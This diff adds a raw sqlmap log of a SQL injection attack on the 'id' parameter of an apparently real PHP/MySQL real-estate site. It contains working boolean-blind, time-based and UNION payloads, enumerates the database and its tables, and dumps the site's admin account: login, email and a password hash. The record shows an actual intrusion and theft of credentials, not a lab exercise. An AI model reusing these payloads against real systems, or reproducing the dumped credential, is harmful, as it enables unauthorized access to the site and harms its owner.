@@ -1,0 +1,96 @@
+sqlmap identified the following injection point(s) with a total of 53 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=47 AND 2266=2266
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=47 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: id=47 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b627a71,0x45776d674a5874475566656d546442587a6c4763634c6143644672745166766b44694b7741487072,0x7170786a71)-- zkaY
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.3.29, Apache 2.4.33
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] grupoewm_incorporadora
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=47 AND 2266=2266
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=47 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: id=47 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b627a71,0x45776d674a5874475566656d546442587a6c4763634c6143644672745166766b44694b7741487072,0x7170786a71)-- zkaY
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.3.29, Apache 2.4.33
+back-end DBMS: MySQL >= 5.0.12
+Database: grupoewm_incorporadora
+[6 tables]
++-------------------------+
+| ewm_inc_home_imagens    |
+| ewm_inc_imoveis         |
+| ewm_inc_imoveis_imagens |
+| ewm_inc_imoveis_tipos   |
+| ewm_inc_sec_users       |
+| ewm_inc_status          |
++-------------------------+
+
+Database: grupoewm_incorporadora
++-------------------------+---------+
+| Table                   | Entries |
++-------------------------+---------+
+| ewm_inc_imoveis_imagens | 465     |
+| ewm_inc_imoveis         | 37      |
+| ewm_inc_home_imagens    | 8       |
+| ewm_inc_imoveis_tipos   | 7       |
+| ewm_inc_status          | 2       |
+| ewm_inc_sec_users       | 1       |
++-------------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=47 AND 2266=2266
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=47 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: id=47 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b627a71,0x45776d674a5874475566656d546442587a6c4763634c6143644672745166766b44694b7741487072,0x7170786a71)-- zkaY
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.3.29, Apache 2.4.33
+back-end DBMS: MySQL >= 5.0.12
+Database: grupoewm_incorporadora
+Table: ewm_inc_sec_users
+[1 entry]
++----------------------------------+-------+-------+-----------------+--------+------------+-----------------+
+| pswd                             | name  | login | email           | active | priv_admin | activation_code |
++----------------------------------+-------+-------+-----------------+--------+------------+-----------------+
+| ac61b7cc418ed58cc8304b1fc664ffe6 | Admin | admin | admin@admin.com | Y      | Y          | NULL            |
++----------------------------------+-------+-------+-----------------+--------+------------+-----------------+
+
